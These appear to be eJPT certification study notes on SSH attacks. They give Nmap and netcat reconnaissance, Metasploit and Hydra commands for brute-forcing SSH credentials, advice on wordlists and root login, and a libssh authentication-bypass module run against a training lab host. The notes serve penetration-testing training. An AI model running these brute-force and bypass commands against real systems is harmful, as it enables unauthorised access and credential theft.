## 1. Service Discovery & Banner Grabbing

### Nmap (Recommended First Step)

```bash
# Basic version detection
nmap -sV -p 22 <target>

# More detailed SSH scripts
nmap -p 22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos <target>
```

**Useful NSE Scripts:**

- `ssh-auth-methods` → Shows supported authentication methods (password, publickey, keyboard-interactive, etc.)
- `ssh-hostkey` → Retrieves the host key fingerprint
- `ssh2-enum-algos` → Lists supported key exchange, encryption, and MAC algorithms

### Manual Banner Grabbing (Netcat)

```bash
nc -nv <target> 22
```
You will usually see something like:
```
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
```

> [!tip] eJPT Tip
> Always start with Nmap. It is faster for discovery and gives you version + script output in one command.

---

## 2. SSH Version Detection (Metasploit)

### Module: `auxiliary/scanner/ssh/ssh_version`

**Purpose:** Quickly fingerprint the SSH service version and banner without needing credentials.

**How to use:**
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target>          # or 192.168.XX.XX/24 for range
set THREADS 10
run
```

**What you get:**
- SSH protocol version
- Software version + OS info from the banner
- Helps identify outdated/vulnerable SSH versions (e.g., very old OpenSSH with public exploits)

---

## 3. SSH Credential Testing / Brute Force

### Module: `auxiliary/scanner/ssh/ssh_login`

**Purpose:** Test username/password combinations against the SSH service. Excellent for finding weak/default credentials.

**How to use (with wordlists):**
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set THREADS 10
set STOP_ON_SUCCESS true          # Stop after finding valid credentials
set VERBOSE true
run
```

**Important Options:**
| Option              | Description                                      | Recommended Value      |
|---------------------|--------------------------------------------------|------------------------|
| `RHOSTS`            | Target IP or range                               | `<target>`             |
| `USERNAME`          | Single username                                  | `root` or `admin`      |
| `PASSWORD`          | Single password                                  | `password` or `123456` |
| `USER_FILE`         | Path to username wordlist                        | (see below)            |
| `PASS_FILE`         | Path to password wordlist                        | (see below)            |
| `THREADS`           | Number of concurrent attempts                    | 5–20 (don't go too high) |
| `STOP_ON_SUCCESS`   | Stop module when valid creds are found           | `true`                 |
| `USER_AS_PASS`      | Try username as password                         | `true`                 |

> [!warning] Important
> High thread counts can cause account lockouts or be detected. Start with lower threads in labs.

### Wordlists (Provided in Metasploit)

```bash
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
```

**Tips for wordlists in eJPT:**

- These are basic but effective for default/weak credentials in labs.
- You can also use `rockyou.txt` (if available in the lab environment).
- Create custom wordlists based on target information (company name, usernames found elsewhere).

---

## 4. Alternative Tools (Very Useful in eJPT)

### Hydra (Fast & Commonly Used)

```bash
hydra -L common_users.txt -P common_passwords.txt ssh://<target>
hydra -l root -P passwords.txt ssh://<target> -t 4
```

### Other Helpful Commands

```bash
# Check if root login is allowed (after you have some access)
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no root@<target>

# Enumerate supported authentication methods
nmap -p 22 --script ssh-auth-methods <target>
```

---

## 5. Common Findings & What They Mean

| Finding                        | Implication                              | Next Step                     |
|--------------------------------|------------------------------------------|-------------------------------|
| Old SSH version (e.g., 5.x or 6.x) | Possible public exploits available     | Move to Exploitation phase   |
| Weak/default credentials       | Easy initial access                      | Login and begin Post-Exploitation |
| `permitrootlogin yes`          | Root login allowed                       | Try root account             |
| Only password auth enabled     | No key-based auth                        | Focus on password brute force |
| Key-based auth only            | Need private key                         | Look for exposed keys        |

---

## 6. eJPT Exam & Lab Tips

- **Always start with Nmap** before jumping into Metasploit.
- Use `STOP_ON_SUCCESS true` in Metasploit to save time once you find valid credentials.
- If brute force is slow, reduce `THREADS` or switch to Hydra.
- Document every valid credential you find (username + password + service).
- After successful login, immediately note:
  - Can you escalate privileges?
  - What users exist on the system?
  - Any interesting files in home directories?
- SSH is often the **easiest path** to a shell in eJPT Linux machines.

> [!note] Remember the Methodology
> Reconnaissance → Scanning → **Enumeration** → Exploitation → Post-Exploitation

---

## Quick Reference Commands

```bash
# Nmap discovery + scripts
nmap -sV -p 22 --script ssh-auth-methods,ssh-hostkey <target>

# Metasploit version scan
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target>
run

# Metasploit brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set THREADS 10
set STOP_ON_SUCCESS true
run

# Hydra
hydra -L users.txt -P passwords.txt ssh://<target> -t 6
```


-----

Metsplopotable Modules of SSH

```
msfconsole -q
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS demo.ine.local
set SPAWN_PTY true
exploit

sessions -i 1
```